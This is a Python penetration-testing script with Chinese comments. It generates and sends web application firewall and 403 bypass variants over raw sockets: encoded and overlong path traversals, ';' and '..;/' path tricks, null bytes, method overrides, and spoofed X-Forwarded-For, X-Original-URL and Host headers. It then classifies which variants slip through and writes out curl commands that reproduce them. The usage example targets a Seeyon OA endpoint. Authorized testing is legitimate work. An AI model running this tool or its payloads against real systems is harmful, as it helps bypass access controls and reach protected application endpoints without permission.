#!/usr/bin/env python3
r"""waf_mutate.py — WAF/403 绕过矩阵引擎（裸 socket 投递 + 模块化变体 + 自动校准）。

为什么需要它（2026-09-21 立，来源见 skills/waf-bypass-techniques/references/waf-bypass-case-notes.md）：
  ① 手工挑 45 个变体打一个 pattern，覆盖面远不如模块化生成；
  ② **投递必须保真**：HTTP 库可能替我们重编码/规范化路径，那样"变体"根本没按原样发出去。
     业界共识（gobypass403 的卖点就是 "true raw HTTP without normalization"）—— 故本工具用裸 socket。
  ③ **先校准再判读**：拿「被拦的路径」「不存在的路径」「正常路径」各打一次学习三种指纹，
     否则会把应用的 catch-all 页当成"绕过成功"（我 2026-09-21 真犯过这个错）。

用法（在 _PT工作台 目录执行）：
  $py scripts\waf_mutate.py https://oa.example.com/seeyon/autoinstall.do.css/..;/ajax.do
  $py scripts\waf_mutate.py <url> --only headers_scheme,headers_host,path_prefix
  $py scripts\waf_mutate.py <url> --out results/waf-mutate-<slug>

输出：控制台分类清单 + <out>/waf-mutate.json + <out>/interesting.curl.txt（可直接复现）
"""
from __future__ import annotations

import argparse
import json
import re
import socket
import ssl
import sys
import urllib.parse
from datetime import datetime
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
UA = "Mozilla/5.0 (compatible; authorized-src-audit)"


def out(s=""):
    print(s, flush=True)


# ---------------------------------------------------------------- 变体生成
def gen_variants(path: str, host: str) -> list:
    """返回 [(module, label, path, method, headers)]。path 一律**原样**传给 socket。"""
    V = []
    def add(mod, label, p=None, m="GET", h=None):
        V.append((mod, label, p if p is not None else path, m, h or {}))

    # 1) char_encode：点/斜杠的各种编码
    base = path
    pairs = [("dot %2e", base.replace("..", "%2e%2e")), ("dot double %252e", base.replace("..", "%252e%252e")),
             ("dot overlong %c0%ae", base.replace("..", "%c0%ae%c0%ae")),
             ("dot fullwidth", base.replace("..", "%uff0e%uff0e")),
             ("slash %2f", base.replace("/", "%2f", 1)),
             ("traversal %2f", base.replace("../", "..%2f")),
             ("backslash %5c", base.replace("../", "..%5c"))]
    for lb, p in pairs:
        if p != base:
            add("char_encode", lb, p)

    # 2) mid_paths：遍历段中间插东西
    if "../" in base:
        for lb, ins in [("mid /./", "./"), ("mid //", "/"), ("mid /;/", ";"), ("mid /.;/", ".;"),
                        ("mid /%20/", "%20"), ("mid /%09/", "%09"), ("mid /%2e/", "%2e")]:
            add("mid_paths", lb, base.replace("../", ins + "../", 1))

    # 3) end_paths：尾部加后缀
    for lb, suf in [("end ;", ";"), ("end ;.css", ";.css"), ("end .", "."), ("end %20", "%20"),
                    ("end %09", "%09"), ("end %00", "%00"), ("end //", "//")]:
        add("end_paths", lb, base + suf)

    # 4) path_prefix：最前面加前缀
    for lb, pre in [("pre /./", "/./"), ("pre //", "//"), ("pre /;/", "/;/"), ("pre /%2f/", "/%2f/")]:
        add("path_prefix", lb, pre + base.lstrip("/"))

    # 5) http_methods
    for m in ("POST", "OPTIONS", "PUT", "PATCH", "HEAD"):
        add("http_methods", "method " + m, m=m)
    add("http_methods", "X-HTTP-Method-Override", h={"X-HTTP-Method-Override": "POST"})

    # 6) case_substitution
    seg = base.rsplit("/", 1)
    if len(seg) == 2:
        add("case_substitution", "upper dir", seg[0].upper() + "/" + seg[1])
        add("case_substitution", "upper file", seg[0] + "/" + seg[1].upper())

    # 7-11) headers_*
    add("headers_scheme", "X-Forwarded-Proto https", h={"X-Forwarded-Proto": "https"})
    add("headers_scheme", "Front-End-Https on", h={"Front-End-Https": "on"})
    add("headers_ip", "X-Forwarded-For 127.0.0.1", h={"X-Forwarded-For": "127.0.0.1"})
    add("headers_ip", "X-Real-IP 127.0.0.1", h={"X-Real-IP": "127.0.0.1"})
    add("headers_ip", "X-Originating-IP", h={"X-Originating-IP": "127.0.0.1"})
    add("headers_port", "X-Forwarded-Port 443", h={"X-Forwarded-Port": "443"})
    add("headers_url", "X-Original-URL", h={"X-Original-URL": "/" + base.strip("/").split("/")[-1]})
    add("headers_url", "X-Rewrite-URL", h={"X-Rewrite-URL": "/" + base.strip("/").split("/")[-1]})
    add("headers_host", "Host 127.0.0.1", h={"Host": "127.0.0.1"})
    add("headers_host", "Host localhost", h={"Host": "localhost"})

    # 12) nginx_bypasses：nginx 解析怪癖
    for lb, p in [("nginx /.;/", base.replace("../", ".;/", 1)),
                  ("nginx /..;/ 双写", base.replace("../", "..;/", 1)),
                  ("nginx trailing space", base + "%20"),
                  ("nginx %2e%2e%2f", base.replace("../", "%2e%2e%2f", 1))]:
        if p != base:
            add("nginx_bypasses", lb, p)
    return V


# ---------------------------------------------------------------- 裸 socket 投递
def raw_request(host, port, use_tls, raw_path, method="GET", headers=None, timeout=15):
    """**原样**发送 raw_path（不做任何编码/规范化）。返回 (status, headers_dict, body_preview)。"""
    h = {"Host": host, "User-Agent": UA, "Accept": "*/*", "Connection": "close"}
    h.update(headers or {})
    req = "%s %s HTTP/1.1\r\n" % (method, raw_path)
    for k, v in h.items():
        req += "%s: %s\r\n" % (k, v)
    req += "\r\n"
    try:
        s = socket.create_connection((host, port), timeout=timeout)
        if use_tls:
            c = ssl.create_default_context()
            c.check_hostname = False
            c.verify_mode = ssl.CERT_NONE
            s = c.wrap_socket(s, server_hostname=host)
        s.sendall(req.encode("latin-1", "replace"))
        buf = b""
        while len(buf) < 6000:
            try:
                chunk = s.recv(4096)
            except Exception:
                break
            if not chunk:
                break
            buf += chunk
        s.close()
    except Exception as exc:
        return -1, {}, ("%s: %s" % (type(exc).__name__, exc))
    head, _, body = buf.partition(b"\r\n\r\n")
    lines = head.decode("latin-1", "replace").split("\r\n")
    status = -1
    if lines and len(lines[0].split()) > 1 and lines[0].split()[1].isdigit():
        status = int(lines[0].split()[1])
    hd = {}
    for ln in lines[1:]:
        if ":" in ln:
            k, v = ln.split(":", 1)
            hd[k.strip()] = v.strip()
    return status, hd, body[:500].decode("utf-8", "replace")


# ---------------------------------------------------------------- 指纹与判读
def fingerprint(status, hd, body):
    """粗粒度指纹：状态码 + Content-Type + 正文前缀特征（用于聚类）。"""
    ct = hd.get("Content-Type", "")
    mark = ""
    low = body.lower()
    for kw in ("width=device-width, initial", "异常处理页面", "__logout", "not found", "404 not found"):
        if kw in low:
            mark = kw
            break
    return "%s|%s|%s" % (status, ct.split(";")[0], mark)


def main() -> int:
    if sys.stdout.encoding and sys.stdout.encoding.lower() not in ("utf-8", "utf8"):
        try:
            sys.stdout.reconfigure(encoding="utf-8", errors="replace")
        except Exception:
            pass
    ap = argparse.ArgumentParser(description="WAF 403 绕过矩阵引擎（裸 socket 投递）")
    ap.add_argument("url", help="被拦的完整 URL（含路径）")
    ap.add_argument("--only", help="只跑这些模块，逗号分隔")
    ap.add_argument("--out", help="产物目录")
    ap.add_argument("--timeout", type=float, default=15)
    ap.add_argument("--max", type=int, default=0, help="最多跑几个变体（0=全部）")
    ap.add_argument("--app-probe", default="/",
                    help="应用身份探针路径（默认 /）。变体若改变了应用身份 ⇒ 判为「换了应用」而非「绕过」")
    a = ap.parse_args()

    u = urllib.parse.urlsplit(a.url)
    host, port, tls = u.hostname, (u.port or (443 if u.scheme == "https" else 80)), (u.scheme == "https")
    raw_path = u.path + (("?" + u.query) if u.query else "")
    outdir = Path(a.out) if a.out else (ROOT / "results" / ("waf-mutate-" + datetime.now().strftime("%Y%m%d-%H%M%S")))
    outdir.mkdir(parents=True, exist_ok=True)
    out("== waf_mutate: %s ==" % a.url)
    out("   host=%s port=%d tls=%s path=%s" % (host, port, tls, raw_path))

    # ---- 校准：被拦 / 不存在 / 正常
    st_b, hd_b, bd_b = raw_request(host, port, tls, raw_path, timeout=a.timeout)
    fp_blocked = fingerprint(st_b, hd_b, bd_b)
    rnd = "/" + "zzq-nonexistent-%d" % (abs(hash(raw_path)) % 100000)
    st_n, hd_n, bd_n = raw_request(host, port, tls, rnd, timeout=a.timeout)
    fp_notfound = fingerprint(st_n, hd_n, bd_n)
    st_o, hd_o, bd_o = raw_request(host, port, tls, "/", timeout=a.timeout)
    fp_normal = fingerprint(st_o, hd_o, bd_o)
    out("   [校准] 被拦=%s" % fp_blocked)
    out("   [校准] 不存在=%s" % fp_notfound)
   
    out("   [校准] 正常根=%s" % fp_normal)
    out("")

    variants = gen_variants(raw_path, host)
    if a.only:
        want = {x.strip() for x in a.only.split(",") if x.strip()}
        variants = [v for v in variants if v[0] in want]
    if a.max:
        variants = variants[: a.max]
    out("   变体总数=%d 模块=%s" % (len(variants), ",".join(sorted({v[0] for v in variants}))))
    out("")

    rows, interesting = [], []
    for mod, label, p, m, h in variants:
        st, hd, bd = raw_request(host, port, tls, p, method=m, headers=h, timeout=a.timeout)
        fp = fingerprint(st, hd, bd)
        if fp == fp_blocked:
            cls = "仍被拦"
        elif fp == fp_notfound:
            cls = "路由不存在"
        elif fp == fp_normal:
            cls = "★回到正常业务"
        else:
            cls = "★差异（值得看）"
        # ⚠️ 2026-09-21 补（**我自己踩过的假绕过**）：换 Host 之后不再被拦，可能只是
        # 换到了别的 vhost（实测 Host: nlcpress.com 能"绕过"WAF，但 /seeyon/ 全变 Tomcat 404、
        # 首页变成另一个站点 ⇒ 根本没在打同一个应用）。故对差异项追加**应用身份校验**：
        # 用同样的 headers 请求 --app-probe，若它的指纹也变了 ⇒ 换了应用，不是绕过。
        same_app, probe_fp = True, ""
        if cls.startswith("★"):
            ps, ph, pb = raw_request(host, port, tls, a.app_probe, method=m, headers=h, timeout=a.timeout)
            probe_fp = fingerprint(ps, ph, pb)
            same_app = (probe_fp == fp_normal)
            if not same_app:
                cls = "✗换了应用（非绕过）"
        rec = {"module": mod, "label": label, "path": p, "method": m, "headers": h,
               "status": st, "fp": fp, "class": cls, "same_app": same_app,
               "app_probe_fp": probe_fp, "snippet": bd[:160]}
        rows.append(rec)
        if cls.startswith("★"):
            interesting.append(rec)
            out("  [%s] %-18s %-26s %s" % (st, mod, label, " ".join(bd[:80].split())))
    out("")
    n_waf = sum(1 for r in rows if r["class"] == "仍被拦")
    n_404 = sum(1 for r in rows if r["class"] == "路由不存在")
    n_app = sum(1 for r in rows if r["class"].startswith("✗"))
    out("  合计 %d 变体：仍被拦 %d / 路由不存在 %d / 换应用(非绕过) %d / **真差异 %d**"
        % (len(rows), n_waf, n_404, n_app, len(interesting)))
    _ = (n_waf, n_404, n_app)


    (outdir / "waf-mutate.json").write_text(json.dumps(
        {"ts": datetime.now().isoformat(timespec="seconds"), "url": a.url,
         "calibration": {"blocked": fp_blocked, "notfound": fp_notfound, "normal": fp_normal},
         "rows": rows}, ensure_ascii=False, indent=1), encoding="utf-8")
    if interesting:
        lines = ["# 可直接复现的 curl（★差异项）", ""]
        for r in interesting:
            hh = " ".join("-H '%s: %s'" % (k, v) for k, v in r["headers"].items())
            lines.append("curl -k -i -X %s 'https://%s%s' %s" % (r["method"], host, r["path"], hh))
        (outdir / "interesting.curl.txt").write_text("\n".join(lines), encoding="utf-8")
    out("")
    out("落盘: %s" % outdir)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())